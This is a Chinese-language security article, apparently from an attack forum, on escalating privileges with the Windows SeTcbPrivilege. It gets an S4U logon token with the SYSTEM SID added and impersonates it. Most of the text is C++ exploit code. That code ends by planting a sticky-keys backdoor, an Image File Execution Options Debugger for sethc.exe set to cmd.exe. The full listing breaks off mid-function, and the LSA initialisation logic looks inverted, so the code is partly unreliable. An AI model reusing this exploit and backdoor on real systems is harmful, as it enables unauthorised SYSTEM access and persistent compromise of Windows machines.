禁止任何公众号/营销号转发
=============

SeTcbPrivilege 特权非常有趣， Microsoft 官方文档中被描述为 “Act as part of the operating system”，除此之外，许多书籍、文章和论坛帖子都将 SeTcbPrivilege 特权描述为等同于对机器的完全特权访问。拥有该特权的任何进程可以调用 `LsaLogonUser()` 函数执行创建登录令牌等操作，因此可以充当任意用户。

通常，`LsaLogonUser()` 函数用于使用某种形式的凭据对用户进行身份验证。在 Microsoft 官方文档中， `LsaLogonUser()` 函数定义如下。

```c++
NTSTATUS LsaLogonUser(
  [in]           HANDLE              LsaHandle,
  [in]           PLSA_STRING         OriginName,
  [in]           SECURITY_LOGON_TYPE LogonType,
  [in]           ULONG               AuthenticationPackage,
  [in]           PVOID               AuthenticationInformation,
  [in]           ULONG               AuthenticationInformationLength,
  [in, optional] PTOKEN_GROUPS       LocalGroups,
  [in]           PTOKEN_SOURCE       SourceContext,
  [out]          PVOID               *ProfileBuffer,
  [out]          PULONG              ProfileBufferLength,
  [out]          PLUID               LogonId,
  [out]          PHANDLE             Token,
  [out]          PQUOTA_LIMITS       Quotas,
  [out]          PNTSTATUS           SubStatus
);
```

- \[in\] LsaHandle：指定从上一次调用 `LsaRegisterLogonProcess()` 函数获得的句柄。
- \[in\] OriginName：标识登录尝试的源的字符串。
- \[in\] LogonType：指定所请求登录类型的 [SECURITY\_LOGON\_TYPE](https://learn.microsoft.com/zh-cn/windows/desktop/api/ntsecapi/ne-ntsecapi-security_logon_type) 枚举的值。 如果 LogonType 是 Interactive 或 Batch，则会生成主令牌来表示新用户。 如果 LogonType 是 Network，则会生成模拟令牌。
- \[in\] AuthenticationPackage：用于身份验证的身份验证包的标识符。可以通过调用 [LsaLookupAuthenticationPackage](https://learn.microsoft.com/zh-cn/windows/desktop/api/ntsecapi/nf-ntsecapi-lsalookupauthenticationpackage) 函数来获取此值。
- \[in\] AuthenticationInformation：指向包含身份验证信息的输入缓冲区的指针，例如用户名和/或密码。此缓冲区的格式和内容由身份验证包确定。
- \[in\] AuthenticationInformationLength：指定 AuthenticationInformation 缓冲区的长度（以字节为单位）。
- \[in, optional\] LocalGroups：要添加到经过身份验证的用户令牌中的附加组标识符列表。这些组标识符将与默认组 WORLD 和登录类型组（交互式、批处理或网络）一起添加到每个用户令牌中。
- \[in\] SourceContext：标识源模块（例如会话管理器）的 [TOKEN\_SOURCE](https://learn.microsoft.com/zh-cn/windows/desktop/api/winnt/ns-winnt-token_source) 结构，以及可能对该模块有用的上下文。此信息包含在用户令牌中，可以通过调用 [GetTokenInformation](https://learn.microsoft.com/zh-cn/windows/desktop/api/securitybaseapi/nf-securitybaseapi-gettokeninformation) 函数进行检索。
- \[out\] ProfileBuffer：指向 void 指针的指针，用于接收包含身份验证信息的输出缓冲区的地址，例如登录 shell 和主目录。
- \[out\] ProfileBufferLength：指向 ULONG 的指针，该 ULONG 接收返回的配置文件缓冲区的长度（以字节为单位）。
- \[out\] LogonId：指向接收唯一标识登录会话的 LUID 的缓冲区的指针。此 LUID 由对登录信息进行身份验证的域控制器分配。
- \[out\] Token：指向接收为此会话创建的新用户令牌的句柄的指针。使用完令牌后，通过调用 [CloseHandle](https://learn.microsoft.com/zh-cn/windows/desktop/api/handleapi/nf-handleapi-closehandle) 函数释放该令牌。
- \[out\] Quotas：返回主令牌时，此参数会收到一个 [QUOTA\_LIMITS](https://learn.microsoft.com/zh-cn/windows/desktop/api/winnt/ns-winnt-quota_limits) 结构，该结构包含分配给新登录用户的初始进程的进程配额限制。
- \[out\] SubStatus：如果由于帐户限制而登录失败，此参数将收到有关登录失败的原因的信息。仅当用户的帐户信息有效且登录被拒绝时，才会设置此值。

在 Microsoft 官方文档中，我们注意到，当以下一项或多项为 True 时，调用方需要具有 SeTcbPrivilege：

1. 使用子身份验证包。
2. 使用 KERB\_S4U\_LOGON，调用方请求模拟令牌。
3. `LocalGroups` 参数不是 NULL。

这里我们主要关注第 2、3 点，从文档描述来看，如果使用 KERB\_S4U\_LOGON（该结构包含有关用户（S4U）登录的服务的信息）来登录，那么我们作为调用者就可以拿到一张模拟令牌，如下图所示。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/07/attach-a789b36b430ff1ff2a7b29e4004d1f654676edf2.png)

此外，MSV1\_0\_S4U\_LOGON 结构也是可以的，只是文档中没有体现。并且，如果使用 KERB\_S4U\_LOGON，则调用方必须是域帐户。这两个的结构的语法如下所示。

- KERB\_S4U\_LOGON

```c++
typedef struct _KERB_S4U_LOGON {
    KERB_LOGON_SUBMIT_TYPE MessageType;
    ULONG Flags;
    UNICODE_STRING ClientUpn;   // REQUIRED: UPN for client
    UNICODE_STRING ClientRealm; // Optional: Client Realm, if known
} KERB_S4U_LOGON, *PKERB_S4U_LOGON;
```

- MSV1\_0\_S4U\_LOGON

```c++
typedef struct _MSV1_0_S4U_LOGON {
    MSV1_0_LOGON_SUBMIT_TYPE MessageType;
    ULONG Flags;
    UNICODE_STRING UserPrincipalName; // username or username@domain
    UNICODE_STRING DomainName; // Optional: if missing, using the local machine
} MSV1_0_S4U_LOGON, *PMSV1_0_S4U_LOGON;
```

但是，在实际操作中，我们又该尝试登录哪个用户？此外，如果我们没有 SeImpersonatePrivilege 特权，我们又将如何模拟生成的令牌？

值得庆幸的是，James Forshaw 曾说话一句非常关键的话：

> “*you could use LsaLogonUser to add admin group to a token of your own user, then impersonate.*”

也就是说，我们可以使用 `LsaLogonUser()` 函数将管理员组或本地系统帐户组添加到您自己用户的令牌中，然后进行模拟。

这似乎非常符合我们正在努力做的事情，使用 S4U 登录类型，我们可以获得任何用户的令牌。回顾上面 `[in] LogonType` 参数的描述，如果我们有 SeTcbPrivilege 特权，显然生成的令牌可以是模拟令牌，这意味着我们可以将它分配给线程。

我们可以将 “S-1-5-18” 组 SID 添加到结果令牌，这是本地系统帐户的 SID，如果我们使用这个令牌，我们将拥有系统的全部权限。添加 SYSTEM 帐户的 SID 非常简单，就是操作 `LsaLogonUser()` 的 `LocalGroups` 参数：

```c++
WCHAR systemSID[] = L"S-1-5-18"; 
ConvertStringSidToSid(systemSID, &pExtraSid);

pGroups->Groups[pGroups->GroupCount].Attributes = 
                    SE_GROUP_ENABLED | SE_GROUP_MANDATORY; 
pGroups->Groups[pGroups->GroupCount].Sid = pExtraSid;
pGroups->GroupCount++;
```

这个难题中唯一剩下的部分是我们将如何使用生成的模拟令牌，因为我们假设我们只拥有 SeTcbPrivilege 特权，没有其他与模拟相关的特权。回顾前文有关令牌模拟的相关规则，只要令牌是给我们当前用户的，并且完整性级别小于或等于当前进程完整性级别，我们就应该能够在没有任何特殊权限的情况下模拟令牌。令牌的完整性级别可以在构造令牌时设置。因此，使用 `LsaLogonUser()` 返回的令牌，我们只需将完整性级别设置为 “Medium”，然后调用 `SetThreadToken()` 函数将当前线程的令牌替换为新令牌即可。

如下图所示，本地用户 John 拥有 SeTcbPrivilege 特权。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/07/attach-ea1a2ce713417547d06514592862ef0b816681e7.png)

我们可以通过 `LsaLogonUser()` 函数执行 S4U 登录，并为 John 账户生成一张模拟令牌，最终使用该令牌创建线程，实现提权。下面给出可供参考的利用代码。

### Main

首先通过 `GetCurrentProcess()` 和 `OpenProcessToken()` 函数打开当前进程的句柄，如下所示。

```c++
int wmain(int argc, wchar_t* argv[])
{
    HANDLE hToken = NULL;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
    {
        wprintf(L"[-] OpenProcessToken Error: [%u].\n", GetLastError());
        return 0;
    }

    // Enable SeTcbPrivilege for the current process token.
    if (EnableTokenPrivilege(hToken, SE_TCB_NAME))
    {
        if (NT_SUCCESS(DoS4U(hToken)))
        {
            return 1;
        }
    }
}
```

然后调用 `EnableTokenPrivilege()` 函数，该函数通过 `AdjustTokenPrivileges()` 函数为当前进程开启 SeTcbPrivilege 特权，如下所示。

```c++
BOOL EnableTokenPrivilege(HANDLE hToken, LPCWSTR lpName)
{
    BOOL status = FALSE;
    LUID luidValue = { 0 };
    TOKEN_PRIVILEGES tokenPrivileges;

    // Get the LUID value of the privilege for the local system
    if (!LookupPrivilegeValueW(NULL, lpName, &luidValue))
    {
        wprintf(L"[-] LookupPrivilegeValue Error: [%u].\n", GetLastError());
        return status;
    }

    // Set escalation information
    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Privileges[0].Luid = luidValue;
    tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // Elevate Process Token Access
    if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(tokenPrivileges), NULL, NULL))
    {
        wprintf(L"[-] AdjustTokenPrivileges Error: [%u].\n", GetLastError());
        return status;
    }
    else
    {
        status = TRUE;
    }
    return status;
}
```

然后直接调用 `DoS4U()` 函数，在该函数中执行 S4U 登录等操作。

### DoS4U

`DoS4U()` 函数的内容如下：

```c++
NTSTATUS DoS4U(HANDLE hToken)
{
    NTSTATUS status = 0;
    NTSTATUS subStatus = 0;
    HANDLE hThread = NULL;
    HANDLE phNewToken = NULL;
    PTOKEN_GROUPS pGroups = NULL;
    PSID pLogonSid = NULL;
    PSID pExtraSid = NULL;
    DWORD dwMsgS4ULength;

    PBYTE pbPosition;

    DWORD dwProfile = 0;
    LUID logonId = { 0 };
    ULONG profileBufferLength;
    PVOID profileBuffer;
    QUOTA_LIMITS quotaLimits;
    HANDLE hTokenS4U = NULL;
    PVOID pvProfile = NULL;

    LSA_STRING OriginName = { 15, 16, (PCHAR)"S4U for Windows" };
    PMSV1_0_S4U_LOGON pS4uLogon = NULL;
    TOKEN_SOURCE TokenSource;

    TOKEN_MANDATORY_LABEL TIL = { 0 };

    LPCWSTR szDomain = L".";
    LPCWSTR szUsername = L"John";//the user who has SeTcbPrivilege

    WCHAR systemSID[] = L"S-1-5-18";
    ConvertStringSidToSidW(systemSID, &pExtraSid);

    WCHAR mediumInt[] = L"S-1-16-8192";
    PSID mediumSID = NULL;
    ConvertStringSidToSidW(mediumInt, &mediumSID);

    HANDLE hThreadToken = NULL;
    PTOKEN_MANDATORY_LABEL pTokenIntegrityLevel = NULL;
    DWORD dwLength;
    LPWSTR lpGroupSid;

    if (!GetLogonSID(hToken, &pLogonSid))
    {
        wprintf(L"[-] Unable to find logon SID.\n");
        goto Clear;
    }

    if (!NT_SUCCESS(LsaInit()))
    {
        wprintf(L"[-] Failed to start kerberos initialization.\n");
        goto Clear;
    }

    wprintf(L"[*] Initialize S4U login.\n");
    // Create MSV1_0_S4U_LOGON structure
    dwMsgS4ULength = sizeof(MSV1_0_S4U_LOGON) + (EXTRA_SID_COUNT + (DWORD)wcslen(szDomain) + (DWORD)wcslen(szUsername)) * sizeof(WCHAR);
    pS4uLogon = (PMSV1_0_S4U_LOGON)LocalAlloc(LPTR, dwMsgS4ULength);
    if (pS4uLogon == NULL)
    {
        wprintf(L"[-] LocalAlloc Error: [%u].", GetLastError());
        goto Clear;
    }

    pS4uLogon->MessageType = MsV1_0S4ULogon;
    pbPosition = (PBYTE)pS4uLogon + sizeof(MSV1_0_S4U_LOGON);
    pbPosition = InitUnicodeString(&pS4uLogon->UserPrincipalName, szUsername, pbPosition);
    pbPosition = InitUnicodeString(&pS4uLogon->DomainName, szDomain, pbPosition);

    strcpy_s(TokenSource.SourceName, TOKEN_SOURCE_LENGTH, "User32");
    AllocateLocallyUniqueId(&TokenSource.SourceIdentifier);

    // Add extra SID to token.
    // If the application needs to connect to a Windows Desktop, Logon SID must be added to the Token.
    wprintf(L"[*] Add extra SID S-1-5-18 to token.\n");
    pGroups = (PTOKEN_GROUPS)LocalAlloc(LPTR, sizeof(TOKEN_GROUPS) + 2 * sizeof(SID_AND_ATTRIBUTES));
    if (pGroups == NULL)
    {
        wprintf(L"[-] LocalAlloc Error: [%u].", GetLastError());
        goto Clear;
    }

    // Add Logon Sid, if present.
    if (pLogonSid)
    {
        pGroups->Groups[pGroups->GroupCount].Attributes = SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY;
        pGroups->Groups[pGroups->GroupCount].Sid = pLogonSid;
        pGroups->GroupCount++;
    }

    // If an extra SID is specified to command line, add it to the pGroups structure.
    pGroups->Groups[pGroups->GroupCount].Attributes = SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY;
    pGroups->Groups[pGroups->GroupCount].Sid = pExtraSid;
    pGroups->GroupCount++;

    //pGroups = NULL;

    // Call LSA LsaLogonUser
    // This call required SeTcbPrivilege privilege:
    //    - [1] to get a primary token (vs impersonation token). The privilege MUST be activated.
    //    - [2] to add supplemental SID with LocalGroups parameter.
    //    - [3] to use a username with a domain name different from machine name (or '.').

    status = LsaLogonUser(
        hLSA,
        &OriginName,
        Network,                // Or Batch
        ulAuthenticationPackage,
        pS4uLogon,
        dwMsgS4ULength,
        pGroups,                // LocalGroups
        &TokenSource,           // SourceContext
        &pvProfile,
        &dwProfile,
        &logonId,
        &hTokenS4U,
        &quotaLimits,
        &subStatus
    );
    if (status != STATUS_SUCCESS)
    {
        wprintf(L"[-] LsaLogonUser Error: [0x%x].", status);
        goto Clear;
    }

    wprintf(L"[*] Set the token integrity level to medium.\n");

    TIL.Label.Attributes = SE_GROUP_INTEGRITY;
    TIL.Label.Sid = mediumSID;

    if (!SetTokenInformation(hTokenS4U, TokenIntegrityLevel, &TIL, sizeof(TOKEN_MANDATORY_LABEL) + GetLengthSid(mediumSID)))
    {
        wprintf(L"[-] SetTokenInformation Error: [%u].\n", GetLastError());
    }

    hThread = GetCurrentThread();

    if (!SetThreadToken(&hThread, hTokenS4U))
    {
        wprintf(L"[-] SetThreadToken Error: [%u].\n", GetLastError());
    }

    wprintf(L"[*] LsaLogonUser successfully and get S4U token: \n\n");

    if (!DisplayTokenInformation(hTokenS4U))
    {
        wprintf(L"[-] Failed to get S4U token information.\n");
    }

    wprintf(L"\n[*] Successfully impersonated S4U.\n");
    ExploitSeTcbPrivilege();

    goto Clear;

Clear:
    if (OriginName.Buffer)
        LocalFree(OriginName.Buffer);
    if (pLogonSid)
        LocalFree(pLogonSid);
    if (pExtraSid)
        LocalFree(pExtraSid);
    if (pS4uLogon)
        LocalFree(pS4uLogon);
    if (pGroups)
        LocalFree(pGroups);
    if (hLSA)
        LsaClose(hLSA);
    if (hToken)
        CloseHandle(hToken);
    if (hTokenS4U)
        CloseHandle(hTokenS4U);

    return status;
}
```

该函数首先调用 `LsaInit()` 函数执行 Lsa 初始化的过程。其首先通过 `LsaConnectUntrusted()` API 函数与 LSA 服务器建立不受信任的连接，然后通过 `LsaLookupAuthenticationPackage()` API 获取 MSV1\_0 身份验证包的唯一标识符，如下所示。

```c++
LSA_STRING MSV1_0_PackageName = { 37, 38, (PCHAR)MSV1_0_PACKAGE_NAME };
ULONG   ulAuthenticationPackage = 0;
BOOL    isAuthPackageKerberos = FALSE;
HANDLE  hLSA = NULL;

NTSTATUS KerberosInit()
{
    NTSTATUS status = 0;
    // Open LSA policy handle
    status = LsaConnectUntrusted(&hLSA);
    if (status != STATUS_SUCCESS)
    {
        // Lookup authentication package ID
        status = LsaLookupAuthenticationPackage(hLSA, &MSV1_0_PackageName, &ulAuthenticationPackage);
        isAuthPackageKerberos = NT_SUCCESS(status);
    }
    return status;
}
```

Lsa 初始化完成后，初始化 S4U 登录，主要是初始化 `MSV1_0_S4U_LOGON` 结构体，并设置要登陆的用户名（这里是 John）和域名，如下所示。

```c++
// Create MSV1_0_S4U_LOGON structure
dwMsgS4ULength = sizeof(MSV1_0_S4U_LOGON) + (EXTRA_SID_COUNT + (DWORD)wcslen(szDomain) + (DWORD)wcslen(szUsername)) * sizeof(WCHAR);
pS4uLogon = (PMSV1_0_S4U_LOGON)LocalAlloc(LPTR, dwMsgS4ULength);
if (pS4uLogon == NULL)
{
  wprintf(L"[-] LocalAlloc Error: [%u].", GetLastError());
  goto Clear;
}

pS4uLogon->MessageType = MsV1_0S4ULogon;
pbPosition = (PBYTE)pS4uLogon + sizeof(MSV1_0_S4U_LOGON);
pbPosition = InitUnicodeString(&pS4uLogon->UserPrincipalName, szUsername, pbPosition);
pbPosition = InitUnicodeString(&pS4uLogon->DomainName, szDomain, pbPosition);
```

接着，创建一个 `TOKEN_GROUPS` 结构体，该结构的语法如下，主要包含有关访问令牌中组安全标识符（SID）的信息。

```c++
typedef struct _TOKEN_GROUPS {
  DWORD              GroupCount;
#if ...
  SID_AND_ATTRIBUTES *Groups[];
#else
  SID_AND_ATTRIBUTES Groups[ANYSIZE_ARRAY];
#endif
} TOKEN_GROUPS, *PTOKEN_GROUPS;
```

也正是通过这个结构，将 NT AUTHORITY\\SYSTEM 账户的 SID（S-1-5-18）加入生成的模拟令牌中，如下所示。

```c++
// Add extra SID to token.
// If the application needs to connect to a Windows Desktop, Logon SID must be added to the Token.
wprintf(L"[*] Add extra SID S-1-5-18 to token.\n");
pGroups = (PTOKEN_GROUPS)LocalAlloc(LPTR, sizeof(TOKEN_GROUPS) + 2 * sizeof(SID_AND_ATTRIBUTES));
if (pGroups == NULL)
{
  wprintf(L"[-] LocalAlloc Error: [%u].", GetLastError());
  goto Clear;
}

// Add Logon Sid, if present.
if (pLogonSid)
{
  pGroups->Groups[pGroups->GroupCount].Attributes = SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY;
  pGroups->Groups[pGroups->GroupCount].Sid = pLogonSid;
  pGroups->GroupCount++;
}

// If an extra SID is specified to command line, add it to the pGroups structure.
pGroups->Groups[pGroups->GroupCount].Attributes = SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY;
pGroups->Groups[pGroups->GroupCount].Sid = pExtraSid;
pGroups->GroupCount++;
```

完成上面这些初始化后，将调用 `LsaLogonUser()` 函数执行 S4U 登录过程，登录得到的模拟令牌将保存在 `hTokenS4U` 中，如下所示。

```c++
// Call LSA LsaLogonUser
// This call required SeTcbPrivilege privilege:
//    - [1] to get a primary token (vs impersonation token). The privilege MUST be activated.
//    - [2] to add supplemental SID with LocalGroups parameter.
//    - [3] to use a username with a domain name different from machine name (or '.').

status = LsaLogonUser(
  hLSA,
  &OriginName,
  Network,                // Or Batch
  ulAuthenticationPackage,
  pS4uLogon,
  dwMsgS4ULength,
  pGroups,                // LocalGroups
  &TokenSource,           // SourceContext
  &pvProfile,
  &dwProfile,
  &logonId,
  &hTokenS4U,
  &quotaLimits,
  &subStatus
);
if (status != STATUS_SUCCESS)
{
  wprintf(L"[-] LsaLogonUser Error: [0x%x].", status);
  goto Clear;
}
```

登录完成后，通过 `SetTokenInformation()` 函数将得到的模拟令牌 `hTokenS4U` 的完整性级别设置为 Medium，如下所示。

```c++
WCHAR mediumInt[] = L"S-1-16-8192";
PSID mediumSID = NULL;
ConvertStringSidToSidW(mediumInt, &mediumSID);

// ...

wprintf(L"[*] Set the token integrity level to medium.\n");

TIL.Label.Attributes = SE_GROUP_INTEGRITY;
TIL.Label.Sid = mediumSID;

if (!SetTokenInformation(hTokenS4U, TokenIntegrityLevel, &TIL, sizeof(TOKEN_MANDATORY_LABEL) + GetLengthSid(mediumSID)))
{
  wprintf(L"[-] SetTokenInformation Error: [%u].\n", GetLastError());
}
```

然后调用 `SetThreadToken()` 函数将当前线程的令牌替换为新令牌 `hTokenS4U`，并通过 `DisplayTokenInformation()` 函数输出新令牌的 TokenStatistics、TokenGroups 和 TokenIntegrityLevel 等信息，如下所示。

```c++
hThread = GetCurrentThread();

if (!SetThreadToken(&hThread, hTokenS4U))
{
  wprintf(L"[-] SetThreadToken Error: [%u].\n", GetLastError());
}

wprintf(L"[*] LsaLogonUser successfully and get S4U token: \n\n");

if (!DisplayTokenInformation(hTokenS4U))
{
  wprintf(L"[-] Failed to get S4U token information.\n");
}
```

`DisplayTokenInformation()` 函数主要通过 `GetTokenInformation()` 来枚举令牌的信息，如下所示。

```c++
BOOL DisplayTokenInformation(HANDLE hToken)
{
    BOOL status = FALSE;
    DWORD dwLength = 0;
    PTOKEN_STATISTICS pTokenStatistics = NULL;
    PTOKEN_GROUPS pTokenGroups = NULL;
    PTOKEN_MANDATORY_LABEL pTokenIntegrityLevel = NULL;
    PSID pSid;
    LPWSTR lpGroupSid;
    LPWSTR lpIntegritySid;

    // Get Token Statistics Information
    if (!GetTokenInformation(hToken, TokenStatistics, pTokenStatistics, 0, &dwLength))
    {
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
        {
            wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
            goto Clear;
        }

        pTokenStatistics = (PTOKEN_STATISTICS)LocalAlloc(LPTR, dwLength);
        if (!GetTokenInformation(hToken, TokenStatistics, pTokenStatistics, dwLength, &dwLength))
        {
            wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
            goto Clear;
        }

        wprintf(L" > Token Statistics Information: \n");
        wprintf(L"   Token Id            : %u:%u (%08x:%08x)\n", pTokenStatistics->TokenId.HighPart, pTokenStatistics->TokenId.LowPart, pTokenStatistics->TokenId.HighPart, pTokenStatistics->TokenId.LowPart);
        wprintf(L"   Authentication Id   : %u:%u (%08x:%08x)\n", pTokenStatistics->AuthenticationId.HighPart, pTokenStatistics->AuthenticationId.LowPart, pTokenStatistics->AuthenticationId.HighPart, pTokenStatistics->AuthenticationId.LowPart);
        wprintf(L"   Token Type          : %d\n", pTokenStatistics->TokenType);
        wprintf(L"   Impersonation Level : %d\n", pTokenStatistics->ImpersonationLevel);
        wprintf(L"   Group Count         : %d\n", pTokenStatistics->GroupCount);
        wprintf(L"   Privilege Count     : %d\n\n", pTokenStatistics->PrivilegeCount);

        status = TRUE;
    }

    if (!GetTokenInformation(hToken, TokenGroups, pTokenGroups, 0, &dwLength))
    {
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
        {
            wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
            goto Clear;
        }

        pTokenGroups = (PTOKEN_GROUPS)LocalAlloc(LPTR, dwLength);
        if (!GetTokenInformation(hToken, TokenGroups, pTokenGroups, dwLength, &dwLength))
        {
            wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
            goto Clear;
        }

        wprintf(L" > Token Group Information: \n");
        for (DWORD i = 0; i < pTokenGroups->GroupCount; i++)
        {
            pSid = pTokenGroups->Groups[i].Sid;
            if (!ConvertSidToStringSidW(pSid, &lpGroupSid)) {
                wprintf(L"[-] ConvertSidToStringSidW Error: [%u].\n", GetLastError());
                goto Clear;
            }

            wprintf(L"   %ws\n", lpGroupSid);
        }

        status = TRUE;
    }

    if (!GetTokenInformation(hToken, TokenIntegrityLevel, pTokenIntegrityLevel, 0, &dwLength))
    {
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
        {
            wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
            goto Clear;
        }

        pTokenIntegrityLevel = (PTOKEN_MANDATORY_LABEL)LocalAlloc(LPTR, dwLength);
        if (!GetTokenInformation(hToken, TokenIntegrityLevel, pTokenIntegrityLevel, dwLength, &dwLength))
        {
            wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
            goto Clear;
        }

        wprintf(L"\n > Token Integrity Level: \n");
        pSid = pTokenIntegrityLevel->Label.Sid;
        if (!ConvertSidToStringSidW(pSid, &lpIntegritySid)) {
            wprintf(L"[-] ConvertSidToStringSidW Error: [%u].\n", GetLastError());
            goto Clear;
        }
        wprintf(L"   %ws\n", lpIntegritySid);

        status = TRUE;
        goto Clear;
    }
Clear:
    if (pTokenStatistics != NULL)
        LocalFree(pTokenStatistics);
    if (pTokenGroups != NULL)
        LocalFree(pTokenGroups);

    return status;

}
```

### ExploitSeTcbPrivilege

最后，由于已经获取了 SYSTEM 权限，则调用 `ExploitSeTcbPrivilege()` 函数将通过 `RegCreateKeyExW()` API 在 `Image File Execution Options` 注册表下创建一个子项，然后用 `RegSetValueExW()` API 为粘滞键（sethc.exe）设置 Debugger 键实现映像劫持，实现粘滞键后门，如下所示。

```c++
void ExploitSeTcbPrivilege()
{
    DWORD lResult;
    HKEY hKey;

    LPCWSTR lpCommand = L"\"C:\\Windows\\System32\\cmd.exe\"";

    // Creates the specified registry key.
    lResult = RegCreateKeyExW(
        HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe",
        0,
        NULL,
        NULL,
        KEY_SET_VALUE,
        NULL,
        &hKey,
        NULL
    );
    if (lResult != ERROR_SUCCESS)
    {
        wprintf(L"[-] RegCreateKeyExW Error: [%u].\n", lResult);
        return;
    }
    // Sets the data and type of a specified value under a registry key.
    lResult = RegSetValueExW(hKey, L"Debugger", 0, REG_SZ, (const BYTE*)lpCommand, (wcslen(lpCommand) + 1) * sizeof(WCHAR));
    if (lResult != ERROR_SUCCESS)
    {
        wprintf(L"[-] RegSetValueExW Error: [%u].\n", lResult);
        return;
    }
    wprintf(L"[*] Set Image File Execution Options for sethc.exe successfully with Debugger as %ws.\n", lpCommand);

    return;
}
```

### Full Code

最终的完整代码如下所示。

```c++
#include <Windows.h>
#include <winternl.h>
#define _NTDEF_ 
#include <NTSecAPI.h>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <sddl.h>

#pragma comment(lib, "Secur32.lib")

#define SIZE 200000

#if !defined(NT_SUCCESS)
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

#ifdef __cplusplus
extern "C" VOID WINAPI RtlInitUnicodeString(OUT PUNICODE_STRING DestinationString, IN PCWSTR SourceString);
#endif

#define STATUS_SUCCESS           0
#define EXTRA_SID_COUNT          2

LSA_STRING MSV1_0_PackageName = { 37, 38, (PCHAR)MSV1_0_PACKAGE_NAME };
ULONG   ulAuthenticationPackage = 0;
BOOL    isAuthPackageKerberos = FALSE;
HANDLE  hLSA = NULL;

NTSTATUS LsaClean()
{
    return LsaDeregisterLogonProcess(hLSA);
}

NTSTATUS LsaInit()
{
    NTSTATUS status = 0;
    // Open LSA policy handle
    status = LsaConnectUntrusted(&hLSA);
    if (status != STATUS_SUCCESS)
    {
        // Lookup authentication package ID
        status = LsaLookupAuthenticationPackage(hLSA, &MSV1_0_PackageName, &ulAuthenticationPackage);
        isAuthPackageKerberos = NT_SUCCESS(status);
    }
    return status;
}

void ExploitSeTcbPrivilege()
{
    DWORD lResult;
    HKEY hKey;

    LPCWSTR lpCommand = L"\"C:\\Windows\\System32\\cmd.exe\"";

    // Creates the specified registry key.
    lResult = RegCreateKeyExW(
        HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe",
        0,
        NULL,
        NULL,
        KEY_SET_VALUE,
        NULL,
        &hKey,
        NULL
    );
    if (lResult != ERROR_SUCCESS)
    {
        wprintf(L"[-] RegCreateKeyExW Error: [%u].\n", lResult);
        return;
    }
    // Sets the data and type of a specified value under a registry key.
    lResult = RegSetValueExW(hKey, L"Debugger", 0, REG_SZ, (const BYTE*)lpCommand, (wcslen(lpCommand) + 1) * sizeof(WCHAR));
    if (lResult != ERROR_SUCCESS)
    {
        wprintf(L"[-] RegSetValueExW Error: [%u].\n", lResult);
        return;
    }
    wprintf(L"[*] Set Image File Execution Options for sethc.exe successfully with Debugger as %ws.\n", lpCommand);

    return;
}

BOOL GetLogonSID(HANDLE hToken, PSID* pLogonSid)
{
    BOOL status = FALSE;
    DWORD dwLength = 0;
    PTOKEN_GROUPS pTokenGroups = NULL;

    if (!GetTokenInformation(hToken, TokenGroups, pTokenGroups, 0, &dwLength))
    {
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
        {
            wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
            goto Clear;
        }

        pTokenGroups = (PTOKEN_GROUPS)LocalAlloc(LPTR, dwLength);
        if (!GetTokenInformation(hToken, TokenGroups, pTokenGroups, dwLength, &dwLength))
        {
            wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
            goto Clear;
        }

        for (DWORD i = 0; i < pTokenGroups->GroupCount; i++)
        {
            if ((pTokenGroups->Groups[i].Attributes & SE_GROUP_LOGON_ID) == SE_GROUP_LOGON_ID)
            {
                dwLength = GetLengthSid(pTokenGroups->Groups[i].Sid);
                *pLogonSid = (PSID)LocalAlloc(LPTR, dwLength);
                if (*pLogonSid == NULL)
                {
                    goto Clear;
                }
                if (!CopySid(dwLength, *pLogonSid, pTokenGroups->Groups[i].Sid))
                {
                    goto Clear;
                }
                break;
            }
        }

        status = TRUE;
        goto Clear;
    }
Clear:
    if (status == FALSE)
    {
        if (*pLogonSid != NULL)
            LocalFree(*pLogonSid);
    }

    if (pTokenGroups != NULL)
        LocalFree(pTokenGroups);

    return status;
}

BOOL DisplayTokenInformation(HANDLE hToken)
{
    BOOL status = FALSE;
    DWORD dwLength = 0;
    PTOKEN_STATISTICS pTokenStatistics = NULL;
    PTOKEN_GROUPS pTokenGroups = NULL;
    PTOKEN_MANDATORY_LABEL pTokenIntegrityLevel = NULL;
    PSID pSid;
    LPWSTR lpGroupSid;
    LPWSTR lpIntegritySid;

    // Get Token Statistics Information
    if (!GetTokenInformation(hToken, TokenStatistics, pTokenStatistics, 0, &dwLength))
    {
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
        {
            wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
            goto Clear;
        }

        pTokenStatistics = (PTOKEN_STATISTICS)LocalAlloc(LPTR, dwLength);
        if (!GetTokenInformation(hToken, TokenStatistics, pTokenStatistics, dwLength, &dwLength))
        {
